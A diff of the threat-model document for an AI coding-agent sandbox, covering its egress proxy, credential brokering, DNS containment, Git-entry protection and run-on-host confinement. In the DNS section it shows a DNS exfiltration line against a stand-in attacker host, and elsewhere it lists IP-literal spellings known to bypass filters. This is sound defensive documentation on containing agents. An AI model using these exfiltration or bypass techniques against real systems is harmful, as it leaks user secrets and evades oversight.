@@ -50,6 +50,9 @@ costs are described below.
     create command podman records for the container. `podman inspect` shows it in the container's
     environment, as it shows every variable. An explicit `--env=NAME=VALUE` is on the launch
     command line already and stays in the create command.
+- A credential brokered with `--egress-cred=NAME@HOST` is in neither the sandbox nor a run-on-host
+  command, which see `NAME` set to a placeholder; the proxy puts the value in requests to `HOST`,
+  where it keeps its issuer's authority ("Who holds a brokered value", below).
 
 **Project data reaching a destination nobody chose.**
 
@@ -71,9 +74,9 @@ costs are described below.
 
 - The egress rules limit reachable targets and operations; they do not establish that an allowed
   request is harmless.
-- Whatever the profile — the widest allows any public hostname on port 443 — the proxy refuses
-  other ports and private addresses, cloud metadata services such as 169.254.169.254 included. The
-  proxy validates every resolved address at connection time.
+- Whatever the profile, the proxy refuses other ports and private addresses, cloud metadata
+  services such as 169.254.169.254 included. The proxy validates every resolved address at
+  connection time.
 
 **A session reaching another project, or persisting outside declared state.**
 
@@ -117,9 +120,9 @@ user's next host `git` invocation:
   filesystem treats as that name.
 - It prevents changes to the protected Git entries of every repository rooted at a `.git` entry —
   `config`, `hooks/`, files that redirect Git to another directory, rebase instructions, the
-  bisect state a host git through 2.33 evaluates as shell code, and `objects/info/alternates`,
-  whose paths host git opens — while operational state stays writable, so the agent's own git
-  keeps working.
+  bisect state a host git through 2.33 evaluates as shell code, `rr-cache`, whose existence
+  enables rerere in host merges, and `objects/info/alternates`, whose paths host git opens —
+  while operational state stays writable, so the agent's own git keeps working.
 - It serves the tree live: a repository created on the host mid-session appears at once, with the
   same Git entries protected against modification.
 - It treats a second name of a host-created `.git` or `.ko-agent-sandbox` as that entry: an NTFS
@@ -137,6 +140,10 @@ while a session mutates it:
   would have been.
 - A guarded entry moved to an ordinary name is an ordinary entry there: its Git configuration and
   hooks, or its egress rules, are writable under the new name.
+- On Windows, the test that a `create` never reopens a guarded entry arriving under a second
+  name failed in two of three runs ("a create opened the host's pointer file"); the cause is
+  unverified (`fuse/ko-agent-fs/doc/TODO.md`, "A second name arriving during a name-based
+  mutation").
 - This exception affects the claims above, including protection of repositories created
   mid-session and `.ko-agent-sandbox` (`fuse/ko-agent-fs/doc/security-research.md`, "Windows 8.3
   short names"; `fuse/ko-agent-fs/doc/TODO.md` keeps it open).
@@ -365,7 +372,7 @@ Inspection therefore does not establish that a request contains no project infor
   results travel inside the model-endpoint tunnel, and the provider's infrastructure does the
   searching.
 - The proxy sees one connection to `api.anthropic.com` or `chatgpt.com`, so neither the ruleset
-  nor the audit log (`--proxy-log`) applies to the domains searched — a query is outbound
+  nor the audit log (`--egress-log`) applies to the domains searched — a query is outbound
   information the provider relays onward.
 - Claude Code's WebFetch is the opposite: a direct request from inside the sandbox, through the
   proxy, answered only by an allowed host and logged like any other connection.
@@ -539,7 +546,8 @@ What is measured, each through the whole production stack
 (`fuse/ko-agent-fs/doc/verification-log.md` has the runs):
 
 - the name rule, on macOS against both APFS variants and on Windows against a real NTFS volume;
-- coherency, on macOS and — with the share-lock cost "The project directory" notes — on Windows.
+- coherency, on macOS for `read()` and an established `mmap`, and on Windows for `read()`, with
+  the share-lock cost "The project directory" notes; the `mmap` row has not run on Windows.
 
 The rest is what the README's status line means: on Linux the guarantees are reasoned rather than
 measured, while the filter is the enforcement of every `--write=live` session, on every platform.
@@ -657,9 +665,12 @@ machine's user also runs `sudo` without a password (Fedora CoreOS 44.20260817.3.
   stderr is its log ([doc/run-on-host.md](doc/run-on-host.md)), and a failed write to it has the
   same effect as one to the file.
   - A proxy whose startup lines fail to be written exits before it accepts a connection.
+  - A host-command proxy is not started when its log cannot be created in the project's log
+    directory, and its command is refused with the reason (`RunOnHostProxy.keepAuditLog`): a log
+    in the command's own directory alone is deleted with it.
   - Every later request, a `CONNECT` or not, receives `403` with the reason,
     `audit log cannot be written: <the I/O error>`, in its body, which `ko-sandbox-egress-check`
-    prints, and in its `Proxy-Status` field, which the host-command wrapper reads. The
+    prints, and in its `Proxy-Status` field, which the host-command supervisor reads. The
     proxy stays up to give that answer: podman removes an exited `--rm` container with its
     output, the reason included.
   - A connection whose `allow` line was written before the failure continues to its end: the
@@ -672,9 +683,9 @@ Each connection passes these checks and transitions in order:
 
 1. `CONNECT` only — any other method is a 400
 1. port 443 only
-1. IP-literal targets are refused — not just dotted-quads: the resolver also accepts `127.1`,
-   `0177.0.0.1` and `2130706433` as spellings of `127.0.0.1`, and a match on the first form alone
-   is a known bypass class
+1. IP-literal targets are refused — not just dotted-quads: the resolver also accepts `127.1`
+   and `2130706433` as spellings of `127.0.0.1`, and a match on the first form alone is a known
+   bypass class
 1. the resolved ruleset allows the hostname, by an exact entry in its host map. The map already
    incorporates rule order, including grants that follow denials
 1. DNS is resolved once to obtain the candidate addresses
@@ -728,7 +739,7 @@ step 6 connects through the upstream proxy with a `CONNECT` naming the validated
 Connection and inspected-request events use one log line each. The leading fields are stable for
 tooling; the trailing explanation is intended for people and may change:
 
-    <instant> allow <host> <method> [<target>] -> <ip>
+    <instant> allow <host> <method> [<target>] [inject=<names>] -> <ip>
     <instant> deny  <host> <method> [<target>] <why>
     <instant> error <host> <method> [<target>] <why>
 
@@ -743,8 +754,14 @@ timestamp, including startup lines; the examples below omit it.
 - **`<target>`** appears exactly when a parsed inspected request exists, query string included.
   - The URL is the message an allowed `GET` can carry ("Exfiltration through allowed network
     traffic", above), so the log records it whole, which is also why the log files are owner-only.
-  - Whole, but not arbitrary: a C0 control character or DEL in a request target, a field value or
-    a `CONNECT` authority is refused at the parser.
+  - Whole, but not arbitrary: a C0 control character or DEL in a request target, a field value
+    (HTAB excepted) or a `CONNECT` authority is refused at the parser.
+- **`inject=<names>`** marks an inspected request forwarded with a brokered credential
+  substituted, naming the bindings whose values it carries ("Who holds a brokered value", below).
+  - No value is logged. A placeholder spelled as the launch issued it, anywhere in the target, and
+    a bound parameter's value print as the binding's name, `?sig=AZURE_SAS_SIG`; a percent-escaped
+    spelling of a placeholder prints as sent.
+  - A request denied after the substitution sent no credential, and its line has no `inject`.
 - Every field, `<why>` included, spells a C0 or C1 control character, DEL, U+2028, U+2029, a
   format character (the bidi controls, zero-width characters, U+00AD), an unpaired surrogate, `"`
   and `\` as a Java/Scala string literal would (`\t`, `\u001b`, `\u202e`, `\"`, `\\`).
@@ -773,6 +790,7 @@ The stages emit the following kinds of events:
     # tunnels and inspected requests — step 11 onward
     allow api.anthropic.com CONNECT -> 160.79.104.10
     allow github.com GET /owner/repo?tab=readme -> 140.82.112.3
+    allow api.github.com GET /user inject=GH_TOKEN -> 140.82.112.5
     deny github.com POST /owner/repo.git/git-receive-pack POST not granted
     deny github.com GET /r.git/info/refs?service=git-receive-pack git push ref discovery
     deny github.com GET /r.git/info/refs?service=git-upload-pack git fetch ref discovery
@@ -812,7 +830,8 @@ Startup lines precede these events and use a separate format. They record, in or
    ruleset have the same digest;
 1. grants exceeding a host's defaults;
 1. warnings;
-1. the inspection summary.
+1. the inspection summary;
+1. the brokered credentials' bindings, when a launch has any.
 
 There is no peer-address field: the per-run internal network has one client container.
 
@@ -982,11 +1001,43 @@ Programs not covered by the launcher's prepared trust stores need separate handl
 - Maven, which a project's `./mvnw` brings, trusts what its JDK trusts but by default takes the
   proxy from its settings, neither `HTTPS_PROXY` nor the JDK's `net.properties`; the image ships a
   `~/.m2/settings.xml` naming it (`container/ko-agent-sandbox/m2/settings.xml`). On the host the
-  broker passes the resolver's `aether.connector.http.useSystemProperties` instead
+  supervisor passes the resolver's `aether.connector.http.useSystemProperties` instead
   (`doc/run-on-host.md`, "Maven").
 - A GraalVM native image — the `cs` and `scala` launchers — has no `conf/` and reads no variable,
   so the proxy and CA settings travel as `-D` options in `KO_AGENT_SANDBOX_JAVA_OPTS`, which the
   agent passes by hand.
+
+### Who holds a brokered value
+
+A value bound with `--egress-cred` is held in the memory of the launcher, the runner, a
+supervisor starting a proxy, and each proxy given it:
+
+- No file holds it, and no environment or argument of a process the launcher starts: the launcher
+  removes `NAME` from the environment its processes inherit, and the value travels by pipe
+  (`doc/design.md`, "Credential brokering at the egress proxy").
+- The environment the launcher was started with keeps it as the user gave it, for as long as a
+  launcher that stays resident runs: withholding changes only what its children inherit.
+- Each proxy is given the bindings whose host it inspects, and no other.
+- A proxy is the ruleset's single point of trust and also holds the credentials sent through it:
+  compromising it compromises both.
+
+Brokering protects the value only while the rewrite is the one route a host credential takes into a
+request:
+no other host channel that authenticates — an SSH agent's socket, a key — is mounted ("Credential
+theft"; `SessionBoundaryTest`'s check of every mount).
+
+What brokering leaves open:
+
+- The agent uses the credential at the bound host, within the methods granted there, on every
+  repository or resource its issuer's scope reaches.
+- The placeholder tells the project that `NAME` exists and where the proxy substitutes it.
+- The placeholder of a value with a recognized token prefix is in the value's format: it shows
+  the value's length, where its `-`, `.`, `_` and `~` are, and whether each other character is a
+  digit, an upper- or a lower-case letter. Any other placeholder shows nothing of its value
+  (`doc/egress-proxy.md`, "Where the value goes").
+- A response that echoes the credential reaches the sandbox: responses are not rewritten. A bound
+  header the service stores or sends back is such a route (`doc/egress-proxy.md`, "Where the
+  value goes").
 
 ### Why the rules are per project, in the project, and read-only
 
@@ -1050,15 +1101,15 @@ whole-host grant. It does not prove tenant isolation for every possible origin. 
 request path's syntax and matches it literally, without reproducing the origin's handling of
 percent-escapes, `..`, backslashes, empty segments or letter case:
 
-- A rule's path must be in canonical form or the launch fails.
-- Checks on request spellings depend on the matched scope (`doc/egress-proxy.md`, "The rule file").
-  Under the root a request has the host's least grants and gains nothing by decoding, so `GET` and
-  `HEAD` are exempt from the path-spelling checks there. The other supported methods still refuse
-  percent-encoding and dot segments at the root.
-- The cost is a path the origin would have accepted and this rule refuses, and a path only
-  spellable encoded — a space, a non-ASCII name — that cannot be narrowed at all. A path in the
-  wrong case fails closed on GitHub, where `/MyOrg/` and `/myorg/` are one owner, and on GCS, where
-  they are two buckets, alike.
+- A rule's path must be in canonical form, one spelling per path, or the launch fails
+  (`doc/egress-proxy.md`, "The rule file").
+- Checks on request spellings depend on the matched scope (`doc/egress-proxy.md`, "The rule file"):
+  a read under the root is exempt, since there it has the host's least grants and gains nothing by
+  decoding.
+- The cost is a path the origin would have accepted and this rule refuses, and a path whose only
+  spelling escapes an ASCII character other than a space — `%2F` inside a Cloud Storage object
+  name — that cannot be narrowed at all. A path in the wrong case fails closed on GitHub, where
+  `/MyOrg/` and `/myorg/` are one owner, and on Cloud Storage, where they are two buckets, alike.
 - The proxy does not follow redirects. A client following one sends a new request, which must
   independently satisfy the rules for its destination and path; an earlier grant does not authorize
   the redirected request.
@@ -1089,9 +1140,9 @@ reading as though it were dropped. The warnings:
 
 - A `deny` matching nothing at its position produces a warning under every profile, so a
   misspelled deny does not fail silently.
-- The other two warnings (`doc/egress-proxy.md`, "The rule file") concern lines that grant nothing;
-  a warning rather than a refusal because the check reads the defaults, and a file that launches
-  today must not fail under a later image whose defaults include it.
+- The redundant-grant and taken-back warnings (`doc/egress-proxy.md`, "The rule file") concern
+  lines that grant nothing; a warning rather than a refusal because the check reads the defaults,
+  and a file that launches today must not fail under a later image whose defaults include it.
 
 Every other ambiguity — `doc/egress-proxy.md` lists them — is a failed launch, never ignored
 config.
@@ -1116,9 +1167,27 @@ requires a concrete credentialed-operation requirement before adding that mechan
 
 ### DNS
 
-The sandbox runs with `--dns=none` and a single `--add-host` entry for the proxy. When configured to
-use the proxy for HTTPS, curl, npm and uv send `CONNECT host:443`; the proxy resolves the
-destination, so those requests require no DNS lookup inside the sandbox.
+No DNS query from the sandbox container reaches a server outside the run, so DNS carries no data
+out. Clients configured to use the proxy send `CONNECT host:443`, and the proxy looks up the
+destination only after the ruleset allows it (the connection checks above), so those requests need
+no lookup inside the sandbox. No other place the container can look a name up passes it on:
+
+- **The public resolvers in the image's `resolv.conf`** are unreachable. `--dns=none` means podman
+  writes no `resolv.conf`, so the container keeps the image's own.
+  - The sandbox's network is `--internal`: its routing table holds one on-link entry and no
+    default route, so a packet to a nameserver outside it has nowhere to go and the lookup fails
+    at once rather than travelling anywhere.
+- **The network's own resolver**, aardvark-dns at the network's first address, answers the run's
+  container names and `NXDOMAIN` for every other name, forwarding none.
+  - podman documents this for
+    [`--internal`](https://docs.podman.io/en/latest/markdown/podman-network-create.1.html#internal)
+    networks. aardvark-dns forwards no query from a container attached only to internal networks
+    (`ctr_is_internal` in
+    [`src/dns/coredns.rs`](https://github.com/containers/aardvark-dns/blob/main/src/dns/coredns.rs)).
+- **`/etc/hosts`** holds the one name that must work: `--add-host` puts `egress-proxy` there.
+
+**Routing and the `--internal` network enforce this, not the resolver configuration:** `--dns=none`
+puts no resolver out of reach. Unsetting the proxy variables does not create a route.
 
 What a session is left with, measured from inside one:
 
@@ -1127,15 +1196,13 @@ What a session is left with, measured from inside one:
     $ getent hosts $SECRET.attacker.example
     (no answer, 2 ms)
 
-**Routing is what enforces this, not the resolver configuration.** `--dns=none` means podman writes
-no `resolv.conf`, so the container keeps the image's own — which still names public resolvers. They
-are unreachable: the sandbox's network is `--internal`, its routing table holds one on-link entry
-and no default route, so a packet to a nameserver outside it has nowhere to go and the lookup fails
-at once rather than travelling anywhere. The one name that must work needs no resolver at all,
-because `--add-host` put it in `/etc/hosts`.
+`SessionBoundaryTest` checks failed direct network access, failed external name resolution, the
+absent default route underlying both, and which names the network's resolver answers.
 
-Unsetting the proxy variables does not create a route. `SessionBoundaryTest` checks failed direct
-network access, failed external name resolution, and the absent default route underlying both.
+A run-on-host command's own lookup of an internet name fails too, although its profile grants the
+Mach service the system's resolver library asks (`SeatbeltProfile.MachServices`): under the sbt
+profile, `InetAddress.getAllByName("example.com")` answers `nodename nor servname provided`
+(2026-09-29). The acceptance test's row "DNS resolution (the system's resolver) fails" checks it.
 
 ## Clipboard
 
@@ -1144,14 +1211,14 @@ Clipboard access is off by default because the host clipboard may contain sensit
 `off`, and any other value fails the launch. The enabled channel has these properties:
 
 - **The sandbox asks; the host answers.** The sandbox opens no connection to the host.
-  - The broker — a job of the reaper on POSIX, a thread of the resident launcher on Windows —
+  - The relay — a job of the reaper on POSIX, a thread of the resident launcher on Windows —
     reads requests through a `podman exec` on the FIFO `/tmp/ko-agent-sandbox/clipboard/req` in
     the sandbox, and answers each through another on `rsp` beside it.
   - No host listener, no port, no proxy rule, no file in the project, and nothing moves until a
-    clipboard call from inside (`ClipboardBroker`, the image's `ko-sandbox-clipboard` shim).
+    clipboard call from inside (`ClipboardRelay`, the image's `ko-sandbox-clipboard` shim).
 - **A request is read to a fixed size and no further.** Anything in the sandbox can write the
   FIFO.
-  - What the host reads of one exec's stream is cut at `ClipboardBroker.MaxRequestBytes` whatever
+  - What the host reads of one exec's stream is cut at `ClipboardRelay.MaxRequestBytes` whatever
     a request declares.
   - A `set` whose count passes it is refused, and a body is copied only whole.
   - The rest of an exec's stream after a refused request is dropped.
@@ -1171,8 +1238,8 @@ Clipboard access is off by default because the host clipboard may contain sensit
   including text the user may later paste into a terminal. The user must explicitly select this
   mode.
 - **The channel lasts for the session.**
-  - The FIFOs are on the container's tmpfs, and the broker ends with the sandbox.
-  - If the broker dies, the shim fails within its timeout rather than blocking the TUI
+  - The FIFOs are on the container's tmpfs, and the relay ends with the sandbox.
+  - If the relay dies, the shim fails within its timeout rather than blocking the TUI
     indefinitely.
   - Clipboard contents written by the session can remain after exit.
 
@@ -1210,9 +1277,9 @@ provides the confinement for these commands; they execute outside the container.
     host memory.
   - Windows: AppContainer's ACLs express the grants but not the denies: ACL inheritance has no
     name patterns, so a `.git` created during the command inherits the project's allow.
-- **The sandbox asks; the host answers.** A host-side broker uses a FIFO channel like the clipboard
-  broker's. It starts each command as its child, streams output back, and returns the exit code.
-  There is no host listener or port; the host broker initiates execution (`RunOnHostChannel`, the
+- **The sandbox asks; the host answers.** A host-side runner uses a FIFO channel like the clipboard
+  relay's. It starts each command as its child, streams output back, and returns the exit code.
+  There is no host listener or port; the host runner initiates execution (`RunOnHostChannel`, the
   image's `ko-sandbox-run-on-host` shim).
 - **The profile is the boundary; the request is not.** A request names a program, a working
   directory and arguments.
@@ -1225,26 +1292,29 @@ provides the confinement for these commands; they execute outside the container.
 
   A command's access is:
   - the project, read-write, except `.git` and `.ko-agent-sandbox`: denied at any depth after path
-    resolution, link creation included, with the `.GIT` gap `doc/run-on-host.md` records;
+    resolution, link creation included, with the unmeasured spellings `doc/run-on-host.md` records;
     writes and links are denied as well to what the launch's file rules make read-only and to
     the paths the filter's guard added;
   - its own per-project run-on-host caches;
-  - one Coursier-managed JDK, read-only;
+  - one Coursier-managed JDK, read-only; under `mill`, also the JDK a build directory's
+    `mill-jvm-version` pins, read-only, once a host run provisioned it. A command can write the
+    file that names it, and so choose among the JDKs in your Coursier cache, and nothing outside
+    that cache (`doc/run-on-host.md`, "A pinned JVM");
   - the program's own executable and distribution, read-only: the cs-installed `sbt` and the
     distribution it execs in the Coursier archive cache; the one mill launcher the user
     provisioned; the one Gradle the build directory's wrapper unpacked under
     `$GRADLE_USER_HOME/wrapper/dists` (`~/.gradle/wrapper/dists` when `GRADLE_USER_HOME` is unset);
     the one Maven the project's wrapper unpacked under `$MAVEN_USER_HOME/wrapper/dists`
     (`~/.m2/wrapper/dists` when `MAVEN_USER_HOME` is unset);
-  - a temporary directory for that command — under `mill` and `gradle`, the broker's own, where the
+  - a temporary directory for that command — under `mill` and `gradle`, the runner's own, where the
     daemons' forked JVMs write;
-  - under sbt, the sockets of the launch's sbt server under the broker's own directory; under
+  - under sbt, the sockets of the launch's sbt server under the runner's own directory; under
     `mill`, the one port of the launch's mill daemon;
-  - the port of one egress proxy: the broker's for that program under sbt, `mill` and `gradle`,
+  - the port of one egress proxy: the runner's for that program under sbt, `mill` and `gradle`,
     kept across the launch's commands of one build directory, or the command's own under Maven;
   - that proxy's CA certificate, read-only.
 
-  Everything else user-owned is invisible — the launcher state root and the rest of the user's
+  Every other user-owned file is invisible — the launcher state root and the rest of the user's
   caches included.
 
   The mill daemon and every Gradle process, alone among the host processes, may bind listeners on
@@ -1253,7 +1323,7 @@ provides the confinement for these commands; they execute outside the container.
     or UDP listener where one under sbt or Maven gets `EPERM`.
   - The bind is at any address of this host, not loopback alone: SBPL's `localhost` class admits a
     bind to the wildcard or to the LAN address, and a socket so bound answers at the LAN address
-    (measured from this host, `src/probe/run-on-host-broker-session.sh` G1, G9, G10; the filter
+    (measured from this host, `src/probe/run-on-host-runner-session.sh` G1, G9, G10; the filter
     admits by the local address, so a LAN peer's connection is the same case).
   - The cost is Mill's and Gradle's, and the table at the end of this section states it beside the
     other programs': the mill client's own profile reaches the daemon's one port and the proxy, and
@@ -1286,45 +1356,52 @@ provides the confinement for these commands; they execute outside the container.
   - A launch selecting the program prints the file's hosts, so a host that arrived with the
     repository does not take effect unseen.
   - The proxy reads the file when it starts: a host removed from the file stays reachable from the
-    broker's proxy until it is next created (`doc/run-on-host.md`, "The command's egress proxy").
+    runner's proxy until it is next created (`doc/run-on-host.md`, "The command's egress proxy").
   - The proxy runs under a profile of its own, granting its executable, the system paths and its
     leaf's directory as reads, and the network, and nothing else of the user's: no project, no
     cache, no write anywhere.
-- **The command's environment is a closed set, not the launcher's.** The wrapper constructs it from
-  its own settings, three pass-through variables, and the variables named by `--env` at launch
+- **The command's environment is a closed set, not the launcher's.** The supervisor constructs it
+  from its own settings, three pass-through variables, and the variables named by `--env` at launch
   (`doc/run-on-host.md`, "The command's lifetime and environment", lists them). The same forwarded
   variables reach the sandbox, and `KO_AGENT_SANDBOX_*` is refused on both paths. Inheriting the
   full host environment would expose unrelated secrets, including an upstream proxy credential in
   the launcher's `HTTPS_PROXY`, to agent-chosen code.
-  - The wrapper's settings take precedence, so a forwarded `HTTPS_PROXY` cannot redirect the
+  - The supervisor's settings take precedence, so a forwarded `HTTPS_PROXY` cannot redirect the
     command past its proxy.
-  - The wrapper supplies its JVM properties through HotSpot's `_JAVA_OPTIONS`, replacing any
+  - The supervisor supplies its JVM properties through HotSpot's `_JAVA_OPTIONS`, replacing any
     forwarded value of that variable. These properties take precedence over `JAVA_TOOL_OPTIONS`,
     `JDK_JAVA_OPTIONS` and command-line properties.
   - `MILL_VERSION` names the launcher the profile authorizes, whatever was forwarded.
   - Below the launcher, whose arguments are what the user typed, forwarded names travel to the
-    broker and each command as arguments. Values travel through their environments under carrier
+    runner and each command as arguments. Values travel through their environments under carrier
     names (`RunOnHostSandbox.carrierName`), so no unconfined helper reads an explicit value before
-    the command's environment is built. The broker inherits the launcher's environment as the
+    the command's environment is built. The runner inherits the launcher's environment as the
     launcher's own JVM ran in it, so a name-only forward names a variable already there.
+  - A name brokered with `--egress-cred` is its placeholder in the command's environment ("Who
+    holds a brokered value").
+  - The profile denies the command reading other processes' arguments and environments — the
+    launcher's, the runner's, a supervisor's and `podman`'s, which carry the launching shell's among
+    them (`SeatbeltProfile.ProcessReadRule`; `doc/run-on-host.md`, "The Seatbelt profile").
+    - The one exception is a mill client reading its own daemon's, whose environment the runner
+      built from the same closed set.
 - **A project script runs unconfined only on your explicit yes.** Before its start prompt, the
-  launch finds the mill launchers and the Gradle and Maven distributions its commands would
-  refuse for want of, and offers the run that downloads each: the build directory's own `./mill`,
-  `./gradlew` or `./mvnw`, a project file the agent can edit, shown as the full command, with any
-  character the terminal would act on spelled out, and run, unconfined and in the launcher's
-  environment, only on a `y` to a prompt that says so (`doc/run-on-host.md`, "Program
-  prerequisites"). That is the manual run the refusal asks of you, with the same authority: the
-  script is the project's, and what it downloads lands where your own script runs from. Nothing
-  runs without the answer; a launch without a terminal, or one starting immediately, prints the
-  refusal and runs nothing.
-- **One sbt server, and one mill daemon, per build directory, owned by the launch's broker.** A
+  launch finds the mill launchers, the JDKs mill builds pin, and the Gradle and Maven
+  distributions its commands would refuse for want of, and offers the run that downloads each:
+  the build directory's own `./mill`, `./gradlew` or `./mvnw`, a project file the agent can edit,
+  shown as the full command, with any character the terminal would act on spelled out, and run,
+  unconfined and in the launcher's environment, only on a `y` to a prompt that says so
+  (`doc/run-on-host.md`, "Program prerequisites"). That is the manual run the refusal asks of
+  you, with the same authority: the script is the project's, and what it downloads lands where
+  your own script runs from. Nothing runs without the answer; a launch without a terminal, or one
+  starting immediately, prints the refusal and runs nothing.
+- **One sbt server, and one mill daemon, per build directory, owned by the launch's runner.** A
   thin sbt client attaches to whatever server the build directory's portfile names, and Mill's
   launcher to whatever daemon holds `out/mill-daemon`, and then runs with *that process's*
-  environment — its cache, its confinement or lack of it. So the broker starts the server or daemon
+  environment — its cache, its confinement or lack of it. So the runner starts the server or daemon
   itself, inside its own profile, before the first sbt or `mill` command of a build directory, and
   every command from that directory attaches to it:
-  - the sbt client through the sockets under the broker's own directory;
-  - the `mill` client through the one port the broker observed the daemon listening on, read from
+  - the sbt client through the sockets under the runner's own directory;
+  - the `mill` client through the one port the runner observed the daemon listening on, read from
     `out/mill-daemon/socketPort` as a candidate the file never authorizes.
     - A link redirecting `out/mill-daemon` or an entry in it refuses the command, since Mill's
       launcher would otherwise act on another build directory's daemon through it.
@@ -1333,7 +1410,7 @@ provides the confinement for these commands; they execute outside the container.
       the profile's write grant sets — while the one-port rule keeps the client from attaching to
       it.
 
-  The broker keeps one per build directory it visits, all warm at once, and ends them with the
+  The runner keeps one per build directory it visits, all warm at once, and ends them with the
   launch or when their proxy is gone. A cancel follows the stock program (`doc/run-on-host.md`,
   "Where a host command deviates from the stock program"):
   - an sbt client's disconnect cancels the running exec and the warm server survives for the next
@@ -1343,23 +1420,23 @@ provides the confinement for these commands; they execute outside the container.
 
   Gradle's daemon is Gradle's own.
   - The client starts it under the profile and matches it in a daemon registry of the launch's own,
-    under the broker's `tmp/` — not in the per-project user home, where one launch's
+    under the runner's `tmp/` — not in the per-project user home, where one launch's
     `gradle --stop` would end another launch's builds, and never yours under `~/.gradle`.
-  - The broker records it after each command by pid and start time, the launch's `java.io.tmpdir`
+  - The runner records it after each command by pid and start time, the launch's `java.io.tmpdir`
     in its initial environment identifying it as the launch's, and ends its group, workers and
     test executors in it, with the launch.
-  - A daemon started under a broker that died during the command is unrecorded, and so is one whose
+  - A daemon started under a runner that died during the command is unrecorded, and so is one whose
     build code rewrote that environment in the daemon's own memory, which `ps` reads it from:
     confined and holding nothing of the launch, it exits on Gradle's idle timeout, three hours,
     once idle, and one hung in its build has no bound.
 
   Maven runs once and exits, so no warm process spans its commands.
 
-  A broker signals only its own servers and daemons. The exceptions:
+  A runner signals only its own servers and daemons. The exceptions:
   - A server of *yours* holding a build directory's portfile — from your own terminal, outside any
-    launch — is ended before the broker's starts, and the transcript says so.
+    launch — is ended before the runner's starts, and the transcript says so.
     - It is ended by protocol, which the server runs after the exec it is on, at the socket the
-      broker derives from the build directory using sbt's derivation, never at one the portfile
+      runner derives from the build directory using sbt's derivation, never at one the portfile
       names: the portfile is workspace content, so trusting its spelling would let the project
       redirect an unconfined client exchange to any socket this uid can reach.
     - The derived path is refused if a command could have planted it: resolution proceeds one link
@@ -1373,18 +1450,19 @@ provides the confinement for these commands; they execute outside the container.
       after which the command is refused instead.
     - A terminal `./mill` connecting between that observation and the signal dies with it, and no
       observation closes that window.
-  - A server or daemon another *launch* still owns — its broker's session names the build
+  - A server or daemon another *launch* still owns — its runner's session names the build
     directory — the command attaches to when the one this launch would start has the running one's
-    confinement and environment, and otherwise ends, by that broker's record and under the
+    confinement and environment, and otherwise ends, by that runner's record and under the
     retirement lock every ender of a recorded group holds, then replaces with its own.
     - The owner describes each runtime by a fingerprint of the profile's inputs, the closed
       environment and the proxy's rule lines, the forwarded values included, so a launch that
       forwards a secret never serves one that does not, and a launch whose rules differ never
       resolves through the other's proxy (`doc/run-on-host.md`, "The channel and the command").
     - The request's own launcher flags are not in the fingerprint: they select settings inside a
-      process the profile confines and the wrapper's `_JAVA_OPTIONS` outranks, as they do within a
-      launch (`RunOnHostRuntimeDescriptor.fingerprint` has what they can and cannot reach).
-    - That is the one group of a live launch a broker signals that is not its own — a dead launch's
+      process the profile confines, where the supervisor's `_JAVA_OPTIONS` overrides them, as they
+      do within a launch (`RunOnHostRuntimeDescriptor.fingerprint` has what they can and cannot
+      reach).
+    - That is the one group of a live launch a runner signals that is not its own — a dead launch's
       group the scavenger collects, below — and the record alone attributes it: a file in the
       owner's session directory, which no confined process can write, never the portfile or the
       process table, so nothing a command writes can aim the signal; the group is signalled only
@@ -1397,7 +1475,7 @@ provides the confinement for these commands; they execute outside the container.
     program there;
   - while the launch's daemon lives, your own `./mill` with matching settings attaches to it and
     runs your build under the profile, and one with different settings ends it, as stock Mill does,
-    after which the broker ends yours once idle and starts its own again;
+    after which the runner ends yours once idle and starts its own again;
   - two launches on one project share a build directory's server or daemon only while each would
     start one under the same confinement and environment — otherwise each launch's command ends the
     other's and starts its own, and the warm build the other left is lost with it.
@@ -1420,7 +1498,7 @@ provides the confinement for these commands; they execute outside the container.
   - `--reset` discards them all with the project's other state; `--reset-run-on-host` discards
     those caches alone.
   - The separation is by root, one directory holding them (`doc/run-on-host.md`, "The run-on-host
-    cache"), because Seatbelt has no mount namespace to overlay with (`plan-coursier.md` reaches
+    cache"), because Seatbelt has no mount namespace to overlay with (`doc/plan-coursier.md` reaches
     the same property for the container by a podman `:O` upper).
 - **The command's output names host paths**, as every session's does: the project is mounted at
   its own path ("The project directory", above).
@@ -1436,22 +1514,22 @@ provides the confinement for these commands; they execute outside the container.
   `--run-on-host`"); a session without `--run-on-host` has no such gap.
 - **Teardown follows descriptor lifetime.** The shim holds one FIFO open for the life of its
   request, and the request itself travels on it, so no command starts without its liveness.
-  - An interrupted command, a killed shim and a dead sandbox container all close it, and the broker
-    ends the command with SIGTERM. The wrapper's own hook teardown ends the command's process
+  - An interrupted command, a killed shim and a dead sandbox container all close it, and the runner
+    ends the command with SIGTERM. The supervisor's own hook teardown ends the command's process
     groups and, under Maven, its proxy; appends the command's proxy audit log to the channel's log
     on the host (`doc/run-on-host.md`, "The channel and the command"); and removes the command's
-    directory. The broker's server or daemon stays, as above.
-  - The wrapper holds the broker's pipe the same way: a broker gone, ended or killed, closes it, and
-    the wrapper ends its command by the same teardown. A broker ended by TERM exits only after that
-    teardown, and then ends its own session — its servers', daemons' and proxies' groups, the
-    servers' logs, the daemon starters' output and the proxies' audit logs appended to the
-    channel's log first — as it does at the launch's end.
-  - No server or daemon the broker recorded survives the launch that owns it — a Gradle daemon its
-    client started and the broker then recorded included; one it never recorded is the residual
-    above. A later launch adopts none whose owner is gone: a new broker publishes a new session and
+    directory. The runner's server or daemon stays, as above.
+  - The supervisor holds the runner's pipe the same way: a runner gone, ended or killed, closes it,
+    and the supervisor ends its command by the same teardown. A runner ended by TERM exits only
+    after that teardown, and then ends its own session — its servers', daemons' and proxies'
+    groups, the servers' logs, the daemon starters' output and the proxies' audit logs appended to
+    the channel's log first — as it does at the launch's end.
+  - No server or daemon the runner recorded survives the launch that owns it — a Gradle daemon its
+    client started and the runner then recorded included; one it never recorded is the residual
+    above. A later launch adopts none whose owner is gone: a new runner publishes a new session and
     reuses nothing.
-  - If SIGKILL prevents the wrapper's or the broker's teardown, the recorded groups remain, the
-    broker's servers, daemons and proxies among them, and the next start's scavenger ends them — a
+  - If SIGKILL prevents the supervisor's or the runner's teardown, the recorded groups remain, the
+    runner's servers, daemons and proxies among them, and the next start's scavenger ends them — a
     group only after checking that its leader has the recorded start time, never by guess:
     - a server whose group leader is gone, by the shutdown protocol at the socket its portfile
       names, sent only once that socket resolves inside the dead session's directory;
